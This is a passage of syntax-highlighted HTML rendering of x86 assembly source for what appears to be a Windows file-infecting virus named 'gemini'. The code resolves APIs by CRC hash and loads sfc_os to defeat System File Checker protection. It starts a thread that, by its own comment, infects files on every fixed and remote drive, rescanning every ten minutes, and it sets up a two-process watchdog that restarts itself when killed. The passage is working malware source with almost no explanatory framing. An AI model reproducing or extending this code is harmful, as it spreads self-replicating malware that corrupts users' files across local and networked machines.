        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">crc_inner</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">crc_skip</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4c11db7h</span><span class="sc0">                   </span><span class="sc1">;use generator polymonial (see IEEE 802)</span><span class="sc0">

</span><span class="sc5">crc_skip</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crc_inner</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;carry set if not zero</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;carry not altered by inc</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">crc_outer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">get_export</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;exports must be sorted alphabetically, otherwise GetProcAddress() would fail</span><span class="sc0">
</span><span class="sc1">;this allows to push addresses onto the stack, and the order is known</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">;Name Pointer Table VA</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get export ordinal</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get export RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">scas</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">push_export</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">csum</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'r'</span><span class="sc0">                             </span><span class="sc1">;altered to give sum == 1</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;swap CreateFileW and CreateFileMappingA because of alphabet order</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">swap_create</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_krnapi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swap_create</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kCreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kCreateFileW</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kCreateFileMappingA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;get SFC support if available</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_sfc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"sfc_os"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;Windows XP (forwarder chain from sfc.dll)</span><span class="sc0">

</span><span class="sc5">load_sfc</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">found_sfc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'cfs'</span><span class="sc0">                           </span><span class="sc1">;Windows Me/2000</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">sfcapi_esp</span><span class="sc0">

</span><span class="sc5">found_sfc</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_findmz</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">sfccrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">sfccrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sfccrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sfcapi_pop</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sfccrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">sfcapi_pop</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">sfcapi_esp</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_sfcapi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swap_create</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swap_create</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">calc_sum</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">calc_sum</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">csum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swap_create</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_thr1</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;thread 1: infect files on all fixed and remote drive letters</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">find_drives</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'\:A'</span><span class="sc0">                      </span><span class="sc1">;NEC-PC98 uses A: for boot drive which can be hard disk</span><span class="sc0">

</span><span class="sc5">drive_loop</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetDriveTypeA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DRIVE_FIXED</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">drive_set</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">drive_next</span><span class="sc0">                      </span><span class="sc1">;loop if not DRIVE_REMOTE</span><span class="sc0">

        </span><span class="sc1">;if I were you, you were me</span><span class="sc0">
        </span><span class="sc1">;I wonder who I'd wanna be</span><span class="sc0">
        </span><span class="sc1">;with just one wish you can't refuse</span><span class="sc0">
        </span><span class="sc1">;I wouldn't know what to choose</span><span class="sc0">

</span><span class="sc5">drive_set</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_files</span><span class="sc0">

</span><span class="sc5">drive_next</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">drive_loop</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">                  </span><span class="sc1">;10 minutes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSleep</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_drives</span><span class="sc0">
</span><span class="sc5">find_drives</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">create_thr1</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCreateThread</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;alg for process 1                              |alg for process 2</span><span class="sc0">
</span><span class="sc1">;if argc == 1                                   |if argc == 1</span><span class="sc0">
</span><span class="sc1">;{                                              |{</span><span class="sc0">
</span><span class="sc1">;    pid1 = GetCurrentProcessId                 |    always false for process 2</span><span class="sc0">
</span><span class="sc1">;    do                                         |</span><span class="sc0">
</span><span class="sc1">;    {                                          |</span><span class="sc0">
</span><span class="sc1">;        CreateEventA(event1, true)             |</span><span class="sc0">
</span><span class="sc1">;        CreateEventA(event2, false)            |</span><span class="sc0">
</span><span class="sc1">;        pid2 = CreateProcessA(process2, pid1, event 1, event 2)</span><span class="sc0">
</span><span class="sc1">;        WaitForSingleObject(event2, timeout)   |</span><span class="sc0">
</span><span class="sc1">;restart:                                       |</span><span class="sc0">
</span><span class="sc1">;        CloseHandle(event2)                    |</span><span class="sc0">
</span><span class="sc1">;        CloseHandle(event1)                    |</span><span class="sc0">
</span><span class="sc1">;    }                                          |</span><span class="sc0">
</span><span class="sc1">;    while !signal                              |</span><span class="sc0">
</span><span class="sc1">;}                                              |}</span><span class="sc0">
</span><span class="sc1">;OpenProcess(pid2)                              |OpenProcess(pid1)</span><span class="sc0">
</span><span class="sc1">;OpenEventA(event1)                             |OpenEventA(event1)</span><span class="sc0">
</span><span class="sc1">;OpenEventA(event2)                             |OpenEventA(event2)</span><span class="sc0">
</span><span class="sc1">;do                                             |do</span><span class="sc0">
</span><span class="sc1">;{                                              |{</span><span class="sc0">
</span><span class="sc1">;    if WaitForSingleObject(event1, 0)          |    if WaitForSingleObject(event2, 0)</span><span class="sc0">
</span><span class="sc1">;        break                                  |        break</span><span class="sc0">
</span><span class="sc1">;    ResetEvent(event2)                         |    ResetEvent(event1)</span><span class="sc0">
</span><span class="sc1">;    if !checksum(pid2)                         |    if !checksum(pid1)</span><span class="sc0">
</span><span class="sc1">;        break                                  |        break</span><span class="sc0">
</span><span class="sc1">;    SetEvent(event1)                           |    SetEvent(event2)</span><span class="sc0">
</span><span class="sc1">;    Sleep(sleeplen)                            |    Sleep(sleeplen)</span><span class="sc0">
</span><span class="sc1">;}                                              |}</span><span class="sc0">
</span><span class="sc1">;while WaitForSingleObject(event2, timeout)     |while WaitForSingleObject(event1, timeout)</span><span class="sc0">
</span><span class="sc1">;CloseHandle(pid2)                              |CloseHandle(pid1)</span><span class="sc0">
</span><span class="sc1">;goto restart                                   |goto restart (and process 2 becomes process 1)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;pathname, pid, event1, event2</span><span class="sc0">

</span><span class="sc5">get_cmdline</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetCommandLineA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">find_argv</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">

</span><span class="sc5">find_argv</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_argv</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_argv</span><span class="sc0">

</span><span class="sc5">find_argv1</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;the unpredictable case:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">                         </span><span class="sc1">;how many spaces?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">find_argv1</span><span class="sc0">                      </span><span class="sc1">;can be 0, 1, or 2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">no_argv</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">          </span><span class="sc1">;no args for restart</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skip_argv1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetCurrentProcessId</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.kWaitForSingleObject</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
